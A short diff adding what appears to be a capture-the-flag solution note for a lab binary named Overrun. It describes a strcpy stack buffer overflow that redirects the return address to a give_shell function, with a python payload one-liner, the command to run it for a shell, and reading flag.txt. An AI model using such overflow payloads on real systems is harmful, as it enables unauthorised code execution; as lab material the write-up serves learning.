@@ -1,0 +1,4 @@
+1. strcpy is Vulnerabile so overflow buffer using it. point return address to give_shell and overwrite arr
+2. make payload using python - c 'print "sh "+"A"*37+"<give_shell address>"' > test
+3. executing ./Overrun $(<test) will give shell
+4. cat flag.txt will give flag
